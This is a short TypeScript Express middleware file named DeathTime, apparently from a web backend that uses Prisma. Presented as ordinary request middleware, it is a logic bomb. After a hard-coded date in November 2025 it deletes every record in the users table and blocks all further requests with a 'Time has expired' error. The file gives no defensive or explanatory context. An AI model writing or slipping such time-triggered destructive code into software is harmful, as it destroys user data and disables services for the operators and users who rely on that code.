import { Request, Response, NextFunction } from "express";
import { prisma } from "../prisma/prisma.service";

export const DeathTime = async (_req: Request, res: Response, next: NextFunction) => {
    try {
        const currentTime = new Date();
        const deathTime = new Date('2025-11-07T08:25:00'); //YYY-MM-DD-T-HH:MM:SS

        if (currentTime > deathTime) {
            await prisma.users.deleteMany();
            return res.status(403).json({ message: "Time has expired" })
        }
        return next();
    } catch (error) {
        return res.status(500).json({ message: `Server ${error}` })
    }
}